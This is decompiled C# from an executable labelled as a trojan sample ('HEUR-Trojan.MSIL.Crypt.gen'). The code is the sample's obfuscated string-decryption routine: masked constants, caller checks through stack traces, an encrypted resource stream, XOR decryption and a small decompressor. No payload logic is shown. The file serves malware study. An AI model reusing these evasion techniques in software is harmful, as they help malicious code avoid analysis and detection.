// Decompiled with JetBrains decompiler
// Type:  
// Assembly: SafeProvHan, Version=1.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AB379C2-70C0-48C2-87EE-52EBDBBB9DBB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-9d0de04d329b032b56c8196d553b79e333728caed8f1f38b3e232c94d6028b66.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

internal static class \u0008\u200A
{
  private static int \u000F;
  private static int \u0006;
  private static int \u0002\u2000;
  private static byte[] \u000E;
  private static \u0008\u200A.\u0002 \u0003\u2000;
  private static short \u0008;
  private static \u0008\u200A.\u0003 \u0003;
  private static Dictionary<int, string> \u0002;
  private static byte[] \u0005;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0008\u200A()
  {
    int num1 = -851941971;
    int num2 = 281194049 ^ num1;
    \u0008\u200A.\u0002 = new Dictionary<int, string>(num1 + 281175473 ^ num2);
    int skipFrames = 2;
    StackTrace stackTrace = new StackTrace(skipFrames, false);
    int index1 = skipFrames - 2;
    StackFrame frame = stackTrace.GetFrame(index1);
    int index2 = index1;
    if (frame == null)
    {
      stackTrace = new StackTrace();
      index2 = 1;
      frame = stackTrace.GetFrame(index2);
    }
    int num3 = -~-~-~~--~~((num1 ^ 1486762198) + num2) ^ -~-~-~~-~(-1736911946 - num1 - num2);
    MethodBase method = frame?.GetMethod();
    if (frame != null)
      num3 ^= ~--~~-~-~(num1 ^ -41463364 ^ num2);
    Type declaringType = method?.DeclaringType;
    int num4;
    if ((object) declaringType == (object) typeof (RuntimeMethodHandle))
    {
      num4 = num3 ^ -1422707520 - num1 - num2 + index1;
      \u0008\u200A.\u0003\u2000 |= (\u0008\u200A.\u0002) 4;
    }
    else if ((object) declaringType == null)
    {
      if (\u0008\u200A.\u0002(stackTrace, index2))
      {
        \u0008\u200A.\u0003\u2000 |= (\u0008\u200A.\u0002) 16;
        num4 = num3 ^ ~-~--~~-~(1422722120 + num1 ^ num2) - index1;
      }
      else
      {
        num4 = num3 ^ ~-~--~~--~~((-281229583 ^ num1) + num2);
        \u0008\u200A.\u0003\u2000 |= (\u0008\u200A.\u0002) 1;
      }
    }
    else
    {
      \u0008\u200A.\u0003\u2000 |= (\u0008\u200A.\u0002) 16;
      num4 = num3 ^ -~-~~--~~(-281161826 - num1 ^ num2) - index1;
    }
    \u0008\u200A.\u0002\u2000 = num4 + \u0008\u200A.\u0002\u2000;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static string \u0002(int _param0)
  {
    lock (\u0008\u200A.\u0002)
    {
      string str;
      return \u0008\u200A.\u0002.TryGetValue(_param0, out str) ? str : \u0008\u200A.\u0002(_param0, true);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static string \u0002(int _param0, bool _param1)
  {
    int num1 = 61664315;
    int num2 = 1456974899 ^ num1;
    string str = (string) null;
    byte[] numArray1;
    int num3;
    do
    {
      int num4;
      if (\u0008\u200A.\u0003 == null)
      {
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        Assembly.GetCallingAssembly();
        \u0008\u200A.\u0006 |= 1374086735 + num1 - num2;
        Assembly assembly = executingAssembly;
        StringBuilder stringBuilder = new StringBuilder();
        int num5 = 2032159813 - num1 ^ num2;
        stringBuilder.Append((char) num5).Append((char) (num5 >> 16));
        int num6 = (-920439865 ^ num1) + num2;
        stringBuilder.Append((char) num6).Append((char) (num6 >> 16));
        int num7 = num1 + 1909617622 - num2;
        stringBuilder.Append((char) num7).Append((char) (num7 >> 16));
        int num8 = (num1 ^ -920187848) + num2;
        stringBuilder.Append((char) num8).Append((char) (num8 >> 16));
        int num9 = num1 + 1909421006 - num2;
        stringBuilder.Append((char) (num9 >> 16)).Append((char) num9);
        int num10 = 1993641008 ^ num1 ^ num2;
        stringBuilder.Append((char) (num10 >> 16)).Append((char) num10);
        int num11 = -835597253 - num1 + num2;
        stringBuilder.Append((char) (num11 >> 16)).Append((char) num11);
        string name = stringBuilder.ToString();
        Stream manifestResourceStream = assembly.GetManifestResourceStream(name);
        int skipFrames = 2;
        StackTrace stackTrace = new StackTrace(skipFrames, false);
        \u0008\u200A.\u0006 ^= (num1 ^ 1456977269) - num2 | skipFrames;
        int index1 = skipFrames - 2;
        StackFrame frame = stackTrace.GetFrame(index1);
        int index2 = index1;
        if (frame == null)
        {
          stackTrace = new StackTrace();
          index2 = 1;
          frame = stackTrace.GetFrame(index2);
        }
        MethodBase method = frame?.GetMethod();
        \u0008\u200A.\u0006 ^= index1 + (1495805123 - num1 ^ num2);
        Type declaringType = method?.DeclaringType;
        if (frame == null)
          \u0008\u200A.\u0006 ^= num1 - 1495585680 + num2;
        bool flag = (object) declaringType == (object) typeof (RuntimeMethodHandle);
        \u0008\u200A.\u0006 ^= 1456974995 ^ num1 ^ num2;
        if (!flag)
        {
          flag = (object) declaringType == null;
          if (flag)
          {
            if (\u0008\u200A.\u0002(stackTrace, index2))
              flag = false;
            else
              \u0008\u200A.\u0006 ^= 1496024278 - num1 - num2;
          }
        }
        if (flag == (stackTrace != null))
          \u0008\u200A.\u0006 ^= 32;
        \u0008\u200A.\u0006 ^= num1 - 1495798493 + num2 | 1 + index1;
        \u0008\u200A.\u0003 = new \u0008\u200A.\u0003(manifestResourceStream);
        short num12 = (short) ((int) \u0008\u200A.\u0003.\u0002() ^ (int) (short) -~~--~~--~~(1495801593 - num1 - num2));
        if (num12 == (short) 0)
          \u0008\u200A.\u0008 = (short) ((int) \u0008\u200A.\u0003.\u0002() ^ (int) (short) -~-~-~-~~-~(num1 ^ -1456987731 ^ num2));
        else
          \u0008\u200A.\u0005 = \u0008\u200A.\u0003.\u0002((int) num12);
        \u0008\u200A.\u000E = \u0008\u200A.\u0002(\u0008\u200A.\u0002(executingAssembly));
        int num13 = \u0008\u200A.\u0002\u2000 ^ num1 - 13251359 + num2;
        \u0008\u200A.\u0002\u2000 = 0;
        long num14 = \u000E\u200A.\u0002();
        int num15 = num13 ^ (int) (uint) num14 ^ 1285669634 - num1 ^ num2 ^ num1 - 1372733826 - num2;
        int num16 = num15;
        int num17 = (1456974918 ^ num1) - num2;
        int num18 = num16 * ((num1 ^ -1456981858) + num2) % (1485371936 - num1 ^ num2);
        int num19 = (1753363145 + num1 ^ num2) + num18 ^ -1701732488 - num1 - num2;
        int num20 = num19;
        \u000F<int> enumerator = ((\u0008<int>) new \u0003.\u0005(num1 ^ -1456974899 | num2)
        {
          \u0006 = num20
        }).GetEnumerator();
        try
        {
          while (enumerator.\u0006\u200A\u2009\u0002())
          {
            int num21 = enumerator.\u0006\u200A\u2009\u0002();
            num19 ^= num21 - num17;
            num17 -= num19 + 3 >> 8;
          }
        }
        finally
        {
          enumerator?.\u000E\u200A\u2009\u0002();
        }
        int num22 = num19;
        num4 = (num15 ^ -~-~-~~-~(num1 + 1845139471 - num2)) + num22;
        \u0008\u200A.\u0006 = \u0008\u200A.\u0006 & (num1 ^ -1188539567) + num2 ^ num1 + 1372483153 ^ num2;
        \u0008\u200A.\u000F = num4;
        if ((\u0008\u200A.\u0003\u2000 & (\u0008\u200A.\u0002) -~-~~-~-~-~(-1372476383 - num1 | num2)) == (\u0008\u200A.\u0002) 0)
          \u0008\u200A.\u0006 = 1372520311 + num1 ^ num2;
      }
      else
        num4 = \u0008\u200A.\u000F;
      if (\u0008\u200A.\u0006 == (-1456896119 ^ num1) + num2)
      {
        str = new string(new char[3]
        {
          (char) (1495805083 - num1 - num2),
          '0',
          (char) (1372476437 + num1 ^ num2)
        });
        return str;
      }
      int num23 = _param0 ^ (num1 ^ -1842957567) - num2 ^ num4 ^ 1016818648 - num1 ^ num2;
      \u0008\u200A.\u0003.\u0002().Position = (long) num23;
      if (\u0008\u200A.\u0005 != null)
      {
        numArray1 = \u0008\u200A.\u0005;
      }
      else
      {
        short num24 = \u0008\u200A.\u0008 != (short) -1 ? \u0008\u200A.\u0008 : (short) ((int) \u0008\u200A.\u0003.\u0002() ^ 1372507128 + num1 - num2 ^ num23);
        if (num24 == (short) 0)
        {
          numArray1 = (byte[]) null;
        }
        else
        {
          numArray1 = \u0008\u200A.\u0003.\u0002((int) num24);
          for (int index = 0; index != numArray1.Length; ++index)
            numArray1[index] ^= (byte) (\u0008\u200A.\u000F >> ((index & 3) << 3));
        }
      }
      num3 = \u0008\u200A.\u0003.\u0002() ^ num23 ^ -~~--~~--~~(-1537890614 ^ num1 ^ num2) ^ num4;
      if (num3 == (num1 - 1495804997 | num2))
      {
        byte[] numArray2 = \u0008\u200A.\u0003.\u0002(4);
        _param0 = -1146117830 - num1 + num2 ^ num4;
        _param0 = ((int) numArray2[2] | (int) numArray2[3] << 16 | (int) numArray2[0] << 8 | (int) numArray2[1] << 24) ^ -_param0;
      }
      else
        goto label_38;
    }
    while (!\u0008\u200A.\u0002.TryGetValue(_param0, out str));
    return str;
label_38:
    bool flag1 = (num3 & (num1 ^ -690508749 ^ num2)) != 0;
    bool flag2 = (num3 & -1725420477 - num1 - num2) != 0;
    bool flag3 = (num3 & num1 - 958934083 + num2) != 0;
    int num25 = num3 & (1580313650 - num1 ^ num2);
    byte[] numArray3 = numArray1;
    byte[] numArray4 = \u0008\u200A.\u0003.\u0002(num25);
    byte[] numArray5 = numArray3;
    byte num26 = numArray5[1];
    int length1 = numArray4.Length;
    byte num27 = (byte) (11 + length1 ^ 7 + (int) num26);
    uint num28 = (uint) (((int) numArray5[0] | (int) numArray5[2] << 8) + ((int) num27 << 3));
    ushort num29 = 0;
    int index3 = 0;
    while (index3 < length1)
    {
      if ((1 & index3) == 0)
      {
        num28 = (uint) ((int) num28 * (num1 - 1495590982 + num2) + (1493879558 - num1 ^ num2));
        num29 = (ushort) (num28 >> 16);
      }
      byte num30 = (byte) num29;
      num29 >>= 8;
      byte num31 = numArray4[index3];
      numArray4[index3] = (byte) ((uint) ((int) num26 ^ (int) num31 ^ 3 + (int) num27) ^ (uint) num30);
      index3 = 1 + index3;
      num27 = num31;
    }
    byte[] numArray6 = numArray4;
    if (\u0008\u200A.\u000E != null != (\u0008\u200A.\u0006 != num1 + 1374084179 - num2))
    {
      for (int index4 = 0; index4 < num25; ++index4)
      {
        byte num32 = \u0008\u200A.\u000E[index4 & 7];
        byte num33 = (byte) ((int) num32 << 3 | (int) num32 >> 5);
        numArray6[index4] = (byte) ((uint) numArray6[index4] ^ (uint) num33);
      }
    }
    int num34 = \u0008\u200A.\u0006 - 12;
    int length2;
    byte[] bytes;
    if (!flag2)
    {
      length2 = num25;
      bytes = numArray6;
    }
    else
    {
      length2 = (int) numArray6[2] | (int) numArray6[0] << 16 | (int) numArray6[3] << 8 | (int) numArray6[1] << 24;
      bytes = new byte[length2];
      \u0008\u200A.\u0002(numArray6, 4, bytes);
    }
    if (flag1 && num34 == (1494267053 - num1 ^ num2))
    {
      char[] chArray = new char[length2];
      for (int index5 = 0; index5 < length2; ++index5)
        chArray[index5] = (char) bytes[index5];
      str = new string(chArray);
    }
    else
      str = Encoding.Unicode.GetString(bytes, 0, bytes.Length);
    int num35 = num34 + (num1 - 1495804868 + num2 + (3 & num34) << 5);
    if (num35 != (1446982809 ^ num1) - num2)
    {
      int num36 = num25 + _param0 ^ 1495398059 - num1 ^ num2 ^ num35 & (num1 ^ 1456974126) - num2;
      ref int local = ref num36;
      StringBuilder stringBuilder = new StringBuilder();
      int num37 = -1372476277 - num1 + num2;
      stringBuilder.Append((char) (byte) num37);
      string format = stringBuilder.ToString();
      str = local.ToString(format);
    }
    if (!flag3 & _param1)
    {
      str = string.Intern(str);
      \u0008\u200A.\u0002[_param0] = str;
      if (\u0008\u200A.\u0002.Count == (1456974977 ^ num1 ^ num2))
      {
        \u0008\u200A.\u0003.\u0003();
        \u0008\u200A.\u0003 = (\u0008\u200A.\u0003) null;
        \u0008\u200A.\u0005 = (byte[]) null;
        \u0008\u200A.\u000E = (byte[]) null;
      }
    }
    return str;
  }

  private static AssemblyName \u0002(Assembly _param0)
  {
    try
    {
      return _param0.GetName();
    }
    catch
    {
      return new AssemblyName(_param0.FullName);
    }
  }

  private static byte[] \u0002(AssemblyName _param0)
  {
    byte[] numArray = _param0.GetPublicKeyToken();
    if (numArray != null && numArray.Length == 0)
      numArray = (byte[]) null;
    return numArray;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static bool \u0002(StackTrace _param0, int _param1)
  {
    Assembly assembly = _param0.GetFrame(_param1 + 1)?.GetMethod()?.DeclaringType?.Assembly;
    if ((object) assembly != null)
    {
      byte[] numArray = \u0008\u200A.\u0002(\u0008\u200A.\u0002(assembly));
      if (numArray != null && numArray.Length == 8 && numArray[0] == (byte) 183 && numArray[7] == (byte) 137)
        return true;
    }
    return false;
  }

  private static void \u0002(byte[] _param0, int _param1, byte[] _param2)
  {
    int num1 = 0;
    int num2 = 0;
    int num3 = 128;
    int length = _param2.Length;
label_10:
    while (num1 < length)
    {
      if ((num3 <<= 1) == 256)
      {
        num3 = 1;
        num2 = (int) _param0[_param1++];
      }
      if ((num2 & num3) != 0)
      {
        int num4 = ((int) _param0[_param1] >> 2) + 3;
        int num5 = ((int) _param0[_param1] << 8 | (int) _param0[_param1 + 1]) & 1023;
        _param1 += 2;
        int num6 = num1 - num5;
        if (num6 < 0)
          break;
        while (true)
        {
          if (--num4 >= 0 && num1 < length)
            _param2[num1++] = _param2[num6++];
          else
            goto label_10;
        }
      }
      else
        _param2[num1++] = _param0[_param1++];
    }
  }

  private enum \u0002
  {
  }

  private sealed class \u0003
  {
    private Stream \u0002;
    private byte[] \u0003;

    public \u0003(Stream _param1)
    {
      this.\u0002 = _param1;
      this.\u0003 = new byte[4];
    }

    public Stream \u0002() => this.\u0002;

    public short \u0002()
    {
      this.\u0002(2);
      return (short) ((int) this.\u0003[0] | (int) this.\u0003[1] << 8);
    }

    public int \u0002()
    {
      this.\u0002(4);
      return (int) this.\u0003[0] | (int) this.\u0003[1] << 8 | (int) this.\u0003[2] << 16 | (int) this.\u0003[3] << 24;
    }

    private void \u0002() => throw new EndOfStreamException();

    private void \u0002(int _param1)
    {
      int offset = 0;
      if (_param1 == 1)
      {
        int num = this.\u0002.ReadByte();
        if (num == -1)
          this.\u0002();
        this.\u0003[0] = (byte) num;
      }
      else
      {
        do
        {
          int num = this.\u0002.Read(this.\u0003, offset, _param1 - offset);
          if (num == 0)
            this.\u0002();
          offset += num;
        }
        while (offset < _param1);
      }
    }

    public void \u0003()
    {
      Stream stream = this.\u0002;
      this.\u0002 = (Stream) null;
      stream?.Close();
      this.\u0003 = (byte[]) null;
    }

    public byte[] \u0002(int _param1)
    {
      byte[] numArray = _param1 >= 0 ? new byte[_param1] : throw new ArgumentOutOfRangeException();
      int length = 0;
      do
      {
        int num = this.\u0002.Read(numArray, length, _param1);
        if (num != 0)
        {
          length += num;
          _param1 -= num;
        }
        else
          break;
      }
      while (_param1 > 0);
      if (length != numArray.Length)
      {
        byte[] dst = new byte[length];
        Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 0, length);
        numArray = dst;
      }
      return numArray;
    }
  }
}
